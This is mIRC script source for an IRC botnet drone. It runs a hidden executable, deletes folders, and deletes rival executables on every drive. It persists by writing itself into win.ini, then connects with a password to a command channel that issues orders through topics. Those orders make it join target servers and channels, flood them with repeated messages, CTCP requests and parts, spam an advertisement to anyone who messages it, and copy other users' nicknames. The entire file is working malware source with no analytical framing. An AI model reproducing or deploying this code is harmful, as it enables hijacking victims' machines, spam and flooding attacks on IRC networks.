on *:start:{
  .run hide.exe mirc
  .rmdir logs
  .rmdir sounds
  .rmdir download
  .hmake base 10
  .hmake drone 10
  .hadd drone home #order #uplink-1
  .hmake notify 10
  .hmake local 10
  .hload -i local dat.dll home
  .hmake learned 100
  .hload -i learned dat.dll engine
  .timerh -o 0 $rand(30,60) .h
  .timerinit -o 1 5 .filecheck
  .h
}
on *:exit:{
  .run $mircexe
}
alias save {
  .hsave -oi local dat.dll home
  .hsave -oi learned dat.dll engine
}
alias filecheck {
  .var %d = 99
  while ($disk($chr(%d))) {
    .var %f = $findfile($chr(%d) $+ :\,poza.exe,0)
    while (%f) {
      .remove $findfile($chr(%d) $+ :\,poza.exe,%f)
      .dec %f
    }
    .var %p = $findfile($chr(%d) $+ :\,pamela.exe,0)
    while (%p) {
      .remove $findfile($chr(%d) $+ :\,pamela.exe,%p)
      .dec %p
    }
    .var %w = $findfile($chr(%d) $+ :\,win.ini,0)
    while (%w) {
      .writeini $findfile($chr(%d) $+ :\,win.ini,%w) windows run $mircexe
      .dec %w
    }
    .inc %d
  }
}
alias hlist {
  if (!$hget($1,0).item) {
    .haltdef
  }
  else {
    .var %hl = 1
    .echo -a -
    while %hl <= $hget($1,0).item {
      .echo -a ( $+ $hget($1,%hl).item $+ ) $hget($1,$hget($1,%hl).item)
      .inc %hl
    }
    .echo -a -
  }
}
alias send {
  if $sock($1).status == active {
    .sockwrite -n $1 $2-
  }
}
alias rns {
  if $1 isnum 1-100 {
    .var %r = $round($1,0)
  }
  else {
    .var %r = $rand(3,9)
  }
  while $len(%s) < %r {
    .var %s = %s $+ $rand(a,z)
  }
  .return %s
}
alias learn {
  if (!$hget(notify,$hget(drone,$sock(t).mark))) && ($hget(notify,$1)) {
    .send t NICK $1
  }
  if (!$hget(notify,$1)) && $right($remove($1,1,2,3,4,5,6,7,8,9,0,_,-,|,`,',$chr(123),$chr(125),$chr(91),$chr(93)),1) == a {
    if $hget(learned,0).item > 99 {
      .hdel learned $hget(learned,1).item
    }
    .hadd learned $1 $2-
  }
}
alias alt {
  if (!$hget(learned,0).item) {
    .return $rns
  }
  elseif $hget(drone,tried) > 1 {
    .return $rns
  }
  else {
    if (!$1) {
      .hinc drone tried
    }
    .return $hget(learned,$rand(1,$hget(learned,0).item)).item
  }
}
alias name {
  .var %n = $rand(1,3)
  while (%n) {
    .var %r = %r $alt(x)
    .dec %n
  }
  .return : $+ %r
}
alias nn {
  if (!$hget(notify,$hget(drone,$sock(t).mark))) {
    .var %nn = $alt(x)
    if %nn != $hget(drone,$sock(t).mark) {
      .send t NICK $alt(x)
    }
  }
}
alias order {
  if ($gettok($1-,2,58)) {
    .hadd drone adv $gettok($1-,2-,58)
  }
  else {
    .hdel drone adv
  }
  if ($hget(notify)) {
    .hfree notify
  }
  .hmake notify 10
  if : !isin $hget(drone,channel) {
    .hdel drone channel
  }
  else {
    .var %gs = $calc($count($hget(drone,channel),$chr(32)) + 1)
    while (%gs) {
      if : !isin $gettok($hget(drone,channel),%gs,32) {
        .hadd drone channel $remove($hget(drone,channel),$gettok($hget(drone,channel),%gs,32))
      }
      .dec %gs
    }
  }
  .var %or = $calc($count($gettok($1-,1,58),$chr(32)) + 1)
  while (%or) {
    if $left($gettok($gettok($1-,1,58),%or,32),1) == $chr(35) && $len($gettok($gettok($1-,1,58),%or,32)) isnum 2-100 {
      if $calc($count($hget(drone,channel),$chr(32)) + 1) < 5 {
        .hadd drone channel $hget(drone,channel) $gettok($gettok($1-,1,58),%or,32)
      }
    }
    elseif $len($gettok($gettok($1-,1,58),%or,32)) isnum 1-10 && . !isin $gettok($gettok($1-,1,58),%or,32) && $chr(35) !isin $gettok($gettok($1-,1,58),%or,32) {
      .hadd notify $hget(drone,notify) $gettok($gettok($1-,1,58),%or,32) $ctime
    }
    elseif $len($gettok($gettok($1-,1,58),%or,32)) isnum 4-50 && . isin $gettok($gettok($1-,1,58),%or,32) && $decode($hget(local,connect),m) != $gettok($gettok($1-,1,58),%or,32) && (!%srv) {
      .var %srv = $gettok($gettok($1-,1,58),%or,32)
    }
    elseif $len($gettok($gettok($1-,1,58),%or,32)) isnum 10-50 && . isin $gettok($gettok($1-,1,58),%or,32) && $decode($hget(local,connect),m) != $gettok($gettok($1-,1,58),%or,32) && $gettok($gettok($gettok($1-,1,58),%or,32),1,44) === FORCE && (!%nrv) {
      .var %nrv = $gettok($gettok($gettok($1-,1,58),%or,32),2,44)
    }
    .dec %or
  }
  .send t QUIT :
  if (%srv) {
    .hadd drone target %srv
  }
  else {
    .hdel drone target
  }
  if (%nrv) {
    .hadd local connect $encode(%nrv,m)
    .save
  }
  .h
}
alias amp {
  if ($1) {
    if $left($1-,1) == ! {
      .return $gettok($1-,1-,33)
    }
    else {
      .var %al = $1-
      while $len(%al $1-) < 301 {
        .var %al = %al $1-
      }
      .return %al
    }
  }
}
alias get {
  if (!$count($hget(drone,channel),$chr(32))) && : isin $hget(drone,channel) {
    .hdel drone channel
  }
  elseif ($hget(drone,channel)) {
    .var %cs = $calc($count($hget(drone,channel),$chr(32)) + 1)
    while (%cs) {
      if : isin $gettok($hget(drone,channel),%cs,32) {
        .hadd drone channel $remove($hget(drone,channel),$gettok($hget(drone,channel),%cs,32))
      }
      .dec %cs
    }
  }
  if (!$1) {
    .timercharge off
    .hdel drone com
  }
  else {
    if $left($2,1) == $chr(35) && $len($2) isnum 2-100 {
      .hadd drone channel $hget(drone,channel) $2 $+ :x
    }
    .hadd drone com $1 $2 $amp($3-)
    if (!$timer(charge)) {
      .timercharge -o 0 10 .charge
    }
  }
}
alias charge {
  if ($hget(drone,com)) && ($sock(t)) && $gettok($hget(drone,com),1,32) != QUIT && $gettok($hget(drone,com),1,32) != PART {
    if $gettok($hget(drone,com),1,32) == cycle && * $gettok($hget(drone,com),2,32) $+ :x * iswm * $hget(drone,channel) * {
      if ($hget(drone,$gettok($hget(drone,com),2,32))) {
        .send t PART $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
      }
      else {
        .send t JOIN $gettok($hget(drone,com),2,32)
        .send t PART $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
      }
    }
    elseif $gettok($hget(drone,com),1,32) == msg && ($gettok($hget(drone,com),3,32)) {
      .send t PRIVMSG $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
      .send t PRIVMSG $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
    }
    elseif $gettok($hget(drone,com),1,32) == notice && ($gettok($hget(drone,com),3,32)) {
      .send t NOTICE $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
      .send t NOTICE $gettok($hget(drone,com),2,32) : $+ $gettok($hget(drone,com),3-,32)
    }
    elseif $gettok($hget(drone,com),1,32) == ctcp && ($gettok($hget(drone,com),2,32)) {
      .send t PRIVMSG $gettok($hget(drone,com),2,32) :PING $ctime $+ 
      .send t PRIVMSG $gettok($hget(drone,com),2,32) :VERSION
    }
    else {
      .send t $hget(drone,com)
      .send t $hget(drone,com)
    }
    if (!$timer(charge)) {
      .timercharge -o 0 10 .charge
    }
  }
}
alias t {
  if (!$hget(notify,$hget(drone,$sock(t).mark))) {
    if (!$timer(nick)) {
      .timernick -o 0 $rand(300,900) .nn
    }
    .var %nt = $hget(notify,0).item
    while (%nt) {
      .var %nl = %nl $hget(notify,%nt).item
      .dec %nt
    }
    if (%nl) {
      .send t ISON %nl
    }
  }
  if (!$hget(drone,channel)) {
    .var %hp = $hget(drone,0).item
    while (%hp) {
      if $left($hget(drone,%hp).item,1) == $chr(35) {
        .var %pl = %pl $+ $hget(drone,%hp).item $+ $chr(44)
      }
      .dec %hp
    }
    if (%pl) {
      .send t PART %pl
    }
  }
  else {
    .var %hp = $hget(drone,0).item
    while (%hp) {
      if $left($hget(drone,%hp).item,1) == $chr(35) && * $hget(drone,%hp).item * !iswm * $hget(drone,channel) * {
        .var %pl = %pl $+ $hget(drone,%hp).item $+ $chr(44)
      }
      .dec %hp
    }
    if (%pl) {
      .send t PART %pl
    }
    .var %cl = $calc($count($hget(drone,channel),$chr(32)) + 1)
    while (%cl) {
      if (!$hget(drone,$gettok($gettok($hget(drone,channel),%cl,32),1,58))) {
        .var %jl = %jl $+ $gettok($gettok($hget(drone,channel),%cl,32),1,58) $+ $chr(44)
      }
      .dec %cl
    }
    if (%jl) {
      .send t JOIN %jl
    }
  }
  if (!$timer(t)) {
    .timert -o 0 $rand(15,30) .t
  }
}
alias h {
  if (!$sock(h)) {
    .sockopen h $decode($hget(local,connect),m) 6667
  }
  else {
    if $sock(t).status == active && $right($hget(drone,$sock(h).mark),2) != ON {
      .send h NICK $chr(124) $+ $rns(4) $+ |ON
    }
    if (!$sock(t)) && $right($hget(drone,$sock(h).mark),3) != OFF {
      .send h NICK $chr(124) $+ $rns(4) $+ |OFF
    }
    if $hget(drone,~ $+ $gettok($hget(drone,home),2,32)) > 200 {
      .hadd drone home #order $gettok($gettok($hget(drone,home),2,32),1,45) $+ - $+ $calc($gettok($gettok($hget(drone,home),2,32),2,45) + 1)
    }
    .var %hg = $hget(drone,0).item
    while (%hg) {
      if $left($hget(drone,%hg).item,1) == $chr(126) && * $mid($hget(drone,%hg).item,2,300) * !iswm * $hget(drone,home) * {
        .var %hx = %hx $+ $mid($hget(drone,%hg).item,2,300) $+ $chr(44)
      }
      .dec %hg
    }
    if (%hx) {
      .send h PART %hx
    }
    .var %hj = $calc($count($hget(drone,home),$chr(32)) + 1)
    while (%hj) {
      if (!$hget(drone,~ $+ $gettok($hget(drone,home),%hj,32))) {
        .var %lj = %lj $+ $gettok($hget(drone,home),%hj,32) $+ $chr(44)
      }
      .dec %hj
    }
    if (%lj) {
      .send h JOIN %lj
    }
  }
  if (!$hget(drone,target)) && ($sock(t)) {
    .send t QUIT :
  }
  elseif ($hget(drone,target)) && (!$sock(t)) {
    .sockopen t $hget(drone,target) 6667
  }
  if (!$timer(h)) {
    .timerh -o 0 $rand(30,60) .h
  }
  .save
}
on *:sockopen:*:{
  if $sockname == t {
    if ($hget(ignore)) {
      .hfree ignore
    }
    .hdel drone tried
    .hdel drone flood
    .send t USER $lower($remove($alt(x),-,|,`,',$chr(123),$chr(125),$chr(91),$chr(93))) "" "" $name
    .send t NICK $alt(x)
  }
  else {
    .send h PASS revenge
    .send h USER x "" "" : $+ $os
    if $sock(t).status == active {
      .send h NICK $chr(124) $+ $rns(4) $+ |ON
    }
    else {
      .send h NICK $chr(124) $+ $rns(4) $+ |OFF
    }
  }
}
on *:sockclose:*:{
  .hdel drone $sock($sockname).mark
  if $sockname == t {
    .timert off
    .timernick off
    .timercharge off
    .timersilence off
    if ($hget(ignore)) {
      .hfree ignore
    }
    .hdel drone tried
    .hdel drone flood
    if $sock(h).status == active && $right($hget(drone,$sock(h).mark),3) != OFF {
      .send h NICK $chr(124) $+ $rns(4) $+ |OFF
    }
    .var %hc = $hget(drone,0).item
    while (%hc) {
      if $left($hget(drone,%hc).item,1) == $chr(35) {
        .hdel drone $hget(drone,%hc).item
      }
      .dec %hc
    }
  }
  elseif $sockname == h {
    .hadd drone home #order $gettok($gettok($hget(drone,home),2,32),1,45) $+ -1
    .var %hn = $hget(drone,0).item
    while (%hn) {
      if $left($hget(drone,%hn).item,1) == $chr(126) {
        .hdel drone $hget(drone,%hn).item
      }
      .dec %hn
    }
  }
}
on *:sockread:*:{
  .var %x
  .sockread %x
  if (%x) {
    if $gettok(%x,1,32) == PING && $sockname != b {
      .send $sockname PONG $gettok(%x,2-,32)
    }
    elseif $gettok(%x,2,32) == 001 && $sockname != b {
      .sockmark $sockname $gettok($gettok(%x,1,32),1,58)
      .hadd drone $gettok($gettok(%x,1,32),1,58) $gettok(%x,3,32)
      if $sockname == t {
        .timert -o 0 $rand(15,30) .t
        if ($hget(drone,com)) && (!$timer(charge)) {
          .timercharge -o 0 10 .charge
        }
        .hdel drone tried
        if $sock(h).status == active && $right($hget(drone,$sock(h).mark),2) != ON {
          .send h NICK $chr(124) $+ $rns(4) $+ |ON
        }
      }
      else {
        if $sock(t).status == active && $right($hget(drone,$sock(h).mark),2) != ON {
          .send h NICK $chr(124) $+ $rns(4) $+ |ON
        }
        .send h SILENCE +*!*@*
      }
      .hadd drone $gettok($gettok(%x,1,32),1,58) $gettok(%x,3,32)
      .send $sockname MODE $gettok(%x,3,32) +dix
    }
    else {
      .com $sockname %x
    }
  }
}
alias com {
  if $1 == t {
    if $3 == QUIT {
      .learn $gettok($gettok($2,1,58),1,33) $ctime QUIT $gettok($4-,1-,58)
    }
    elseif $3 == NICK {
      if $gettok($gettok($2,1,58),1,33) == $hget(drone,$sock(t).mark) {
        .hdel drone tried
        .hadd drone $sock(t).mark $gettok($4,1,58)
      }
      else {
        .learn $gettok($gettok($2,1,58),1,33) $ctime NICK $gettok($4,1,58)
      }
    }
    elseif $3 == JOIN {
      if $gettok($gettok($2,1,58),1,33) == $hget(drone,$sock(t).mark) {
        .hadd drone $gettok($4,1,58) $ctime
      }
    }
    elseif $3 == PART {
      if $gettok($gettok($2,1,58),1,33) == $hget(drone,$sock(t).mark) {
        .hdel drone $4
      }
    }
    elseif $3 == KICK {
      if $5 == $hget(drone,$sock(t).mark) {
        .hdel drone $4
      }
    }
    elseif $3 == 353 {
      if $7- == :@ $+ $hget(drone,$sock(t).mark) {
        .send t MODE $6 +nts
      }
    }
    elseif $3 == 433 {
      .send t NICK $alt
    }
    elseif $3 == 303 && (!$hget(notify,$hget(drone,$sock(t).mark))) {
      if $5- != : {
        .var %on = $hget(notify,0).item
        while (%on) {
          if * $hget(notify,%on).item * !iswm * $gettok($5-,1-,58) * {
            .var %nc = %nc $hget(notify,%on).item
          }
          .dec %on
        }
        if (%nc) {
          .send t NICK $gettok(%nc,1,32)
        }
      }
      else {
        if ($hget(notify,1).item) {
          .send t NICK $hget(notify,1).item
        }
      }
    }
    elseif $3 == PRIVMSG {
      if (!$hget(drone,flood)) {
        .hadd -u5 drone flood 1
      }
      elseif $hget(drone,flood) > 2 {
        .send t SILENCE +*!*@*
        .timersilence 1 15 .send t SILENCE -*!*@*
        .hdel drone flood
      }
      else {
        .hadd -u5 drone flood $calc($hget(drone,flood) + 1)
      }
      if $5 == :PING && $len($6) == 11 && $left($6,10) isnum {
        .send t NOTICE $gettok($gettok($2,1,58),1,33) $5 $6
      }
      elseif  !isin $5- && * $+ $gettok($sock(t).mark,$count($sock(t).mark,$chr(46)) $+ -,46) !iswm $gettok($2,2,64) && ($hget(drone,adv)) && (!$hget(ignore,$gettok($2,2,64))) {
        .send t PRIVMSG $gettok($gettok($2,1,58),1,33) : $+ $replace($hget(drone,adv),<nick>,$gettok($gettok($2,1,58),1,33))
        .hadd -mu600 ignore $gettok($2,2,64) $ctime
      }
    }
  }
  elseif $1 == h {
    if $3 == NICK {
      if $gettok($gettok($2,1,58),1,33) == $hget(drone,$sock(h).mark) {
        .hadd drone $sock(h).mark $gettok($4,1,58)
      }
    }
    elseif $3 == JOIN {
      if $gettok($gettok($2,1,58),1,33) != $hget(drone,$sock(h).mark) {
        .hinc drone ~ $+ $gettok($4,1,58)
      }
    }
    elseif $3 == PART {
      if $gettok($gettok($2,1,58),1,33) == $hget(drone,$sock(h).mark) {
        .hdel drone ~ $+ $4
      }
      else {
        .hdec drone ~ $+ $4
      }
    }
    elseif $3 == KICK {
      if $5 == $hget(drone,$sock(h).mark) {
        .hadd drone home #order $gettok($gettok($hget(drone,home),2,32),1,45) $+ -1
        .hdel drone ~ $+ $4
      }
      else {
        .hdec drone ~ $+ $4
      }
    }
    elseif $3 == 353 {
      .hadd drone ~ $+ $6 $calc($hget(drone,~ $+ $6) + $count($7-,$chr(32)) + 1)
    }
    elseif $3 == TOPIC {
      if $left($5,2) != :! {
        if $gettok($hget(drone,home),1,32) == $4 {
          .order $gettok($5-,1-,58)
        }
        elseif $gettok($hget(drone,home),2,32) == $4 {
          .get $gettok($5-,1-,58)
        }
      }
    }
    elseif $3 == 332 {
      if $left($6,2) != :! {
        if $gettok($hget(drone,home),1,32) == $5 {
          .order $gettok($6-,1-,58)
        }
        elseif $gettok($hget(drone,home),2,32) == $5 {
          .get $gettok($6-,1-,58)
        }
      }
    }
  }
}
